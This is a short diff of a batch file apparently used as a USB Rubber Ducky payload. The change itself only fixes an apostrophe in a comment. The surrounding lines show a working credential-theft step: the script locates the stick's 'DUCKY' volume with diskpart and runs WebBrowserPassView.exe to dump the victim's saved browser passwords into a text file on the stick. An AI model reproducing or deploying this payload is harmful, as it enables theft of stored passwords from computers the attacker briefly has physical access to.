@@ -34,7 +34,7 @@ LAUNCH.BAT file:
 
 for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)
 
-REM Output everything to this folder so I dont have everything on the duck's root. 
+REM Output everything to this folder so I don't have everything on the duck's root. 
 set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks
 
 start %DUCKYdrive%\WebBrowserPassView.exe /stext %DUCKYdrive%\WebBrowserPassView.txt
